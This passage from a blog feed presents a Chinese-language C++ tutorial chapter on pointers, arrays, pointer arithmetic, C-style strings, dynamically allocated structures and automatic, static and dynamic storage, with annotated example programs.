&lt;&lt; <span class="string">&quot;New value: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 50</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指向指针的指针常用于：</p><ul><li>  在函数中修改调用者传入的指针本身（使其指向不同的地址）。</li><li>  处理动态分配的指针数组（例如 <code>char** argv</code> in <code>main</code>）。</li></ul><p><strong>总结:</strong></p><p>通过组合基本类型、数组、结构、指针等，可以构建出非常灵活和强大的数据结构。理解每种组合方式的内存布局、访问方式以及（特别是涉及指针和动态内存时）生命周期管理规则是编写复杂 C++程序的关键。随着学习的深入，我们将看到更多高级的组合和抽象方式，例如使用类和标准库容器。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.8 指针、数组和指针算术</title>
      <link href="2025/04/26/4.8_%E6%8C%87%E9%92%88%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%9C%AF/"/>
      <url>2025/04/26/4.8_%E6%8C%87%E9%92%88%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>指针和数组在 C++ 中有着非常紧密的联系。理解这种关系以及指针算术对于有效地使用 C++ 处理内存和数据集合至关重要。</p><h2 id="4-8-1-程序说明"><a href="#4-8-1-程序说明" class="headerlink" title="4.8.1 程序说明"></a>4.8.1 程序说明</h2><p>指针算术允许我们对指针执行一些特殊的算术运算，主要是加法和减法，以便在内存中移动，特别是在数组中。</p><p><strong>指针与数组名的关系:</strong></p><p>在 C++ 中，数组名在很多情况下会被隐式地当作指向其<strong>第一个元素</strong>的指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> wages[<span class="number">3</span>] = &#123;<span class="number">1000.0</span>, <span class="number">2000.0</span>, <span class="number">3000.0</span>&#125;;</span><br><span class="line">    <span class="keyword">double</span> *p_wages = wages; <span class="comment">// 数组名 wages 被当作指向第一个元素的指针 (&amp;wages[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of first element (&amp;wages[0]): &quot;</span> &lt;&lt; &amp;wages[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of array name (wages):        &quot;</span> &lt;&lt; wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出与 &amp;wages[0] 相同</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of pointer (p_wages):         &quot;</span> &lt;&lt; p_wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出与 &amp;wages[0] 相同</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过指针访问数组元素</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First element via pointer (*p_wages): &quot;</span> &lt;&lt; *p_wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1000.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指针算术: 将指针移动到下一个元素</span></span><br><span class="line">    p_wages = p_wages + <span class="number">1</span>; <span class="comment">// 指针加 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address after p_wages + 1:          &quot;</span> &lt;&lt; p_wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 指向 wages[1] 的地址</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value at *(p_wages + 1) (now *p_wages): &quot;</span> &lt;&lt; *p_wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2000.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用数组下标访问 (即使是通过指针)</span></span><br><span class="line">    p_wages = wages; <span class="comment">// 重置指针指向第一个元素</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Accessing via pointer subscript p_wages[1]: &quot;</span> &lt;&lt; p_wages[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2000.0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Accessing via array name subscript wages[1]: &quot;</span> &lt;&lt; wages[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2000.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数组名和指针的区别:</span></span><br><span class="line">    <span class="comment">// 1. sizeof: sizeof(wages) 是整个数组的大小 (3 * sizeof(double))</span></span><br><span class="line">    <span class="comment">//            sizeof(p_wages) 是指针本身的大小 (通常 4 或 8 字节)</span></span><br><span class="line">    <span class="comment">// 2. 地址: &amp;wages 是整个数组的地址 (类型是 double(*)[3])</span></span><br><span class="line">    <span class="comment">//         &amp;p_wages 是指针变量 p_wages 自身的地址</span></span><br><span class="line">    <span class="comment">// 3. 修改: 数组名 wages 是常量，不能修改 (不能 wages = wages + 1;)</span></span><br><span class="line">    <span class="comment">//         指针 p_wages 是变量，可以修改指向其他地址 (p_wages = p_wages + 1;)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sizeof(wages): &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(wages) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sizeof(p_wages): &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(p_wages) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>指针算术规则:</strong></p><ul><li>  <strong>指针加整数 <code>p + n</code>:</strong> 结果是一个指向 <code>p</code> 原来指向位置之后第 <code>n</code> 个<strong>元素</strong>的地址。编译器会根据指针指向的类型大小自动计算实际地址偏移量（<code>地址 = p的地址 + n * sizeof(指向的类型)</code>）。</li><li>  <strong>指针减整数 <code>p - n</code>:</strong> 结果是一个指向 <code>p</code> 原来指向位置之前第 <code>n</code> 个元素的地址。</li><li>  <strong>指针减指针 <code>p1 - p2</code>:</strong> 结果是两个指针之间相隔的<strong>元素数量</strong>（一个整数）。只有当两个指针指向<strong>同一个数组</strong>（或超出末尾一个位置）中的元素时，这个操作才有意义。结果的类型是 <code>std::ptrdiff_t</code> (在 <code>&lt;cstddef&gt;</code> 中定义)。</li><li>  <strong>递增/递减:</strong> <code>++p</code>, <code>p++</code>, <code>--p</code>, <code>p--</code> 分别使指针指向下一个或上一个元素。</li><li>  <strong>比较:</strong> 可以使用关系运算符 (<code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>) 比较指向<strong>同一个数组</strong>元素的指针，判断它们的相对位置。也可以使用 <code>==</code> 和 <code>!=</code> 比较指针是否指向同一个地址（或是否都为空）。</li></ul><p><strong>数组下标和指针的关系:</strong></p><p>表达式 <code>arrayName[i]</code> 在 C++ 中等价于 <code>*(arrayName + i)</code>。<br>同样，如果 <code>p</code> 是一个指向数组元素的指针，<code>p[i]</code> 等价于 <code>*(p + i)</code>。</p><p>这意味着你可以对数组名使用指针算术（概念上），也可以对指针使用数组下标表示法。</p><h2 id="4-8-2-指针小结"><a href="#4-8-2-指针小结" class="headerlink" title="4.8.2 指针小结"></a>4.8.2 指针小结</h2><p>让我们回顾一下关于指针的关键概念：</p><ol><li> <strong>声明:</strong> 使用 <code>typeName * pointerName;</code> 声明一个指向 <code>typeName</code> 类型数据的指针。</li><li><strong>初始化:</strong><ul><li>  使用 <code>&amp;</code> 获取变量地址: <code>pointerName = &amp;variableName;</code></li><li>  初始化为空指针: <code>pointerName = nullptr;</code> (C++11) 或 <code>pointerName = 0;</code></li><li>  使用 <code>new</code> 分配动态内存: <code>pointerName = new typeName;</code> 或 <code>pointerName = new typeName[size];</code></li></ul></li><li> <strong>解引用:</strong> 使用 <code>*</code> 访问指针指向的值: <code>value = *pointerName;</code> 或 <code>*pointerName = newValue;</code>。</li><li> <strong>指针与数组:</strong> 数组名通常可视为指向第一个元素的常量指针。指针算术允许在数组元素间移动。<code>array[i]</code> 等价于 <code>*(array + i)</code>。</li><li> <strong>动态内存:</strong> 使用 <code>new</code> 分配，必须使用 <code>delete</code> (对应 <code>new</code>) 或 <code>delete[]</code> (对应 <code>new[]</code>) 释放。</li><li> <strong>危险:</strong> 未初始化指针、空指针解引用、悬挂指针、内存泄漏、错误的 <code>delete</code>/<code>delete[]</code> 使用。</li><li> <strong>指针本身 vs 指向的值:</strong> <code>pointerName</code> 存储的是地址，<code>*pointerName</code> 是该地址处的值。</li></ol><h2 id="4-8-3-指针和字符串"><a href="#4-8-3-指针和字符串" class="headerlink" title="4.8.3 指针和字符串"></a>4.8.3 指针和字符串</h2><p>C 风格字符串本质上是 <code>char</code> 类型的数组，以空字符 <code>\0</code> 结尾。因此，指针在处理 C 风格字符串时非常常用。</p><ul><li>  <strong>字符串字面值:</strong> 字符串字面值（如 <code>&quot;Hello&quot;</code>) 在内存中存储为 <code>const char</code> 数组，并以 <code>\0</code> 结尾。字符串字面值本身可以被当作指向其第一个字符的 <code>const char*</code> 指针。</li><li>  <strong><code>char</code> 指针:</strong> 可以声明 <code>char*</code> 或 <code>const char*</code> 指针来指向 C 风格字符串。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // 为了 strlen()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> animal[<span class="number">20</span>] = <span class="string">&quot;bear&quot;</span>; <span class="comment">// animal 是 char 数组</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *bird = <span class="string">&quot;wren&quot;</span>; <span class="comment">// bird 是指向 &quot;wren&quot; 字符串字面值第一个字符 &#x27;w&#x27; 的指针</span></span><br><span class="line">    <span class="keyword">char</span> *p_animal; <span class="comment">// 未初始化的 char 指针</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; animal &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; bird &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// cout 知道如何处理 char* (打印直到 \0)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指针指向数组</span></span><br><span class="line">    p_animal = animal; <span class="comment">// p_animal 指向 animal 数组的第一个字符 &#x27;b&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pointer p_animal points to: &quot;</span> &lt;&lt; p_animal &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;bear&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问字符串内容</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char via array: &quot;</span> &lt;&lt; animal[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// b</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char via pointer: &quot;</span> &lt;&lt; *p_animal &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// b</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指针算术遍历字符串</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using pointer arithmetic:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p_bird = bird;</span><br><span class="line">    <span class="keyword">while</span> (*p_bird != <span class="string">&#x27;\0&#x27;</span>) &#123; <span class="comment">// 循环直到遇到空字符</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *p_bird &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        p_bird++; <span class="comment">// 指针移动到下一个字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 字符串字面值和指针</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p_literal = <span class="string">&quot;This is a literal&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; p_literal &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// p_literal[0] = &#x27;t&#x27;; // 错误! 字符串字面值通常是只读的 (const char*)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 动态分配字符串</span></span><br><span class="line">    <span class="keyword">char</span> *p_dynamic_str = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(<span class="string">&quot;Dynamic String&quot;</span>) + <span class="number">1</span>]; <span class="comment">// +1 为了空字符</span></span><br><span class="line">    <span class="built_in">strcpy</span>(p_dynamic_str, <span class="string">&quot;Dynamic String&quot;</span>); <span class="comment">// 使用 strcpy 复制 (不安全，最好用 strncpy 或 C++ string)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic string: &quot;</span> &lt;&lt; p_dynamic_str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">delete</span> [] p_dynamic_str; <span class="comment">// 释放动态分配的数组</span></span><br><span class="line">    p_dynamic_str = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong></p><ul><li>  <code>cout</code> 对 <code>char*</code> 有特殊处理，它会打印从指针指向地址开始直到遇到空字符 <code>\0</code> 的所有字符。</li><li>  修改字符串字面值是未定义行为，应使用 <code>const char*</code> 指向它们。</li><li>  处理 C 风格字符串时要特别注意缓冲区溢出问题（例如使用 <code>strcpy</code> 时目标数组不够大），并确保字符串以 <code>\0</code> 结尾。<code>std::string</code> 类通常是更安全、更方便的选择。</li></ul><h2 id="4-8-4-使用new创建动态结构"><a href="#4-8-4-使用new创建动态结构" class="headerlink" title="4.8.4 使用new创建动态结构"></a>4.8.4 使用new创建动态结构</h2><p>就像可以动态分配基本类型和数组一样，也可以使用 <code>new</code> 动态创建结构体（或类）对象。</p><p><strong>分配:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StructureName * pointerVariable = <span class="keyword">new</span> StructureName;</span><br></pre></td></tr></table></figure><p>这会在自由存储区分配足够存储 <code>StructureName</code> 结构所有成员的内存，并调用该结构的<strong>构造函数</strong>（如果是类或有构造函数的结构），然后返回指向新创建结构的指针。</p><p><strong>访问成员:</strong></p><p>当通过指针访问结构或类的成员时，不能直接使用点运算符 <code>.</code>。有两种方式：</p><ol><li> <strong>解引用再用点 (<code>(*ptr).member</code>)</strong>: 先解引用指针 <code>*ptr</code> 得到结构本身，然后使用点运算符访问成员。括号是必需的，因为点运算符的优先级高于解引用运算符。</li><li> <strong>箭头运算符 (<code>ptr-&gt;member</code>)</strong>: 这是更常用、更简洁的方式。箭头运算符 <code>-&gt;</code> 专门用于通过指针访问其指向的结构或类的成员。<code>ptr-&gt;member</code> 完全等价于 <code>(*ptr).member</code>。</li></ol><p><strong>释放:</strong></p><p>使用 <code>delete</code> 释放由 <code>new</code> 创建的单个结构对象。<code>delete</code> 会先调用该对象的<strong>析构函数</strong>（如果需要），然后释放内存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> pointerVariable;</span><br><span class="line">pointerVariable = <span class="literal">nullptr</span>; <span class="comment">// 好习惯</span></span><br></pre></td></tr></table></figure><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Inflatable</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">float</span> volume;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 动态创建 Inflatable 结构</span></span><br><span class="line">    Inflatable *ps = <span class="keyword">new</span> Inflatable; <span class="comment">// 在自由存储区创建结构</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问成员</span></span><br><span class="line">    <span class="comment">// 方法 1: 解引用和点运算符</span></span><br><span class="line">    (*ps).name = <span class="string">&quot;Dynamic Floatie&quot;</span>;</span><br><span class="line">    (*ps).volume = <span class="number">1.5f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法 2: 箭头运算符 (更常用)</span></span><br><span class="line">    ps-&gt;price = <span class="number">29.99</span>; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamically created structure:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Name: &quot;</span> &lt;&lt; ps-&gt;name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Volume: &quot;</span> &lt;&lt; (*ps).volume &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 两种方式都可以用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Price: &quot;</span> &lt;&lt; ps-&gt;price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Address: &quot;</span> &lt;&lt; ps &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放动态创建的结构</span></span><br><span class="line">    <span class="keyword">delete</span> ps;</span><br><span class="line">    ps = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Structure deleted.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-8-5-自动存储、静态存储和动态存储"><a href="#4-8-5-自动存储、静态存储和动态存储" class="headerlink" title="4.8.5 自动存储、静态存储和动态存储"></a>4.8.5 自动存储、静态存储和动态存储</h2><p>C++ 程序中的变量和数据根据其内存分配方式和生命周期，可以分为三种主要的存储类别：</p><ol><li><p><strong>自动存储持续性 (Automatic Storage Duration):</strong></p><ul><li>  <strong>内存区域:</strong> 通常在称为<strong>栈 (Stack)</strong> 的内存区域分配。</li><li>  <strong>分配/释放:</strong> 内存的分配和释放在函数（或代码块）进入和退出时自动进行。</li><li>  <strong>生命周期:</strong> 变量在声明它的函数或代码块执行期间存在，块结束时自动销毁。</li><li>  <strong>例子:</strong> 函数内部声明的非 <code>static</code> 局部变量（包括函数参数）。</li><li>  <strong>特点:</strong> 分配和释放速度快，管理简单（自动），但空间有限，生命周期受限于作用域。</li></ul></li><li><p><strong>静态存储持续性 (Static Storage Duration):</strong></p><ul><li>  <strong>内存区域:</strong> 在程序的整个生命周期内都存在于内存的某个固定区域（通常是静态/全局数据区）。</li><li>  <strong>分配/释放:</strong> 内存在程序启动时分配（或首次使用时，对于某些静态变量），在程序结束时释放。</li><li>  <strong>生命周期:</strong> 从程序开始执行到程序结束。</li><li>  <strong>例子:</strong> 在函数外部声明的变量（全局变量）、使用 <code>static</code> 关键字在函数内部或类内部声明的变量。</li><li>  <strong>特点:</strong> 生命周期长，可以跨函数调用保持其值，但全局变量可能导致命名冲突和管理复杂性。</li></ul></li><li><p><strong>动态存储持续性 (Dynamic Storage Duration):</strong></p><ul><li>  <strong>内存区域:</strong> 在称为<strong>自由存储区 (Free Store)</strong> 或 <strong>堆 (Heap)</strong> 的内存区域分配。</li><li>  <strong>分配/释放:</strong> 内存由程序员使用 <code>new</code> (或 <code>malloc</code> 等 C 函数) 显式分配，并且<strong>必须</strong>使用 <code>delete</code> (或 <code>free</code>) 显式释放。</li><li>  <strong>生命周期:</strong> 从 <code>new</code> 分配成功开始，直到程序员使用 <code>delete</code> 释放为止。生命周期与函数或代码块的作用域无关。</li><li>  <strong>例子:</strong> 使用 <code>new</code> 创建的变量、数组或对象。</li><li>  <strong>特点:</strong> 提供了最大的灵活性，可以在运行时根据需要分配任意大小的内存，生命周期由程序员控制。但管理复杂，容易出现内存泄漏（忘记 <code>delete</code>）或悬挂指针（<code>delete</code> 后仍使用指针）等问题。</li></ul></li></ol><p><strong>示例对比:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_static_var = <span class="number">10</span>; <span class="comment">// 静态存储 (全局)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> file_static_var = <span class="number">20</span>; <span class="comment">// 静态存储 (文件作用域)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> auto_var = <span class="number">30</span>; <span class="comment">// 自动存储 (栈)</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> func_static_var = <span class="number">40</span>; <span class="comment">// 静态存储 (函数作用域，只初始化一次)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *dynamic_var = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">50</span>); <span class="comment">// 动态存储 (堆)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Inside func:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  auto_var address: &quot;</span> &lt;&lt; &amp;auto_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; auto_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  func_static_var address: &quot;</span> &lt;&lt; &amp;func_static_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; ++func_static_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  dynamic_var address: &quot;</span> &lt;&lt; dynamic_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; *dynamic_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">delete</span> dynamic_var; <span class="comment">// 必须手动释放动态内存</span></span><br><span class="line">    dynamic_var = <span class="literal">nullptr</span>;</span><br><span class="line">&#125; <span class="comment">// auto_var 在这里销毁</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Global static var address: &quot;</span> &lt;&lt; &amp;global_static_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; global_static_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;File static var address: &quot;</span> &lt;&lt; &amp;file_static_var &lt;&lt; <span 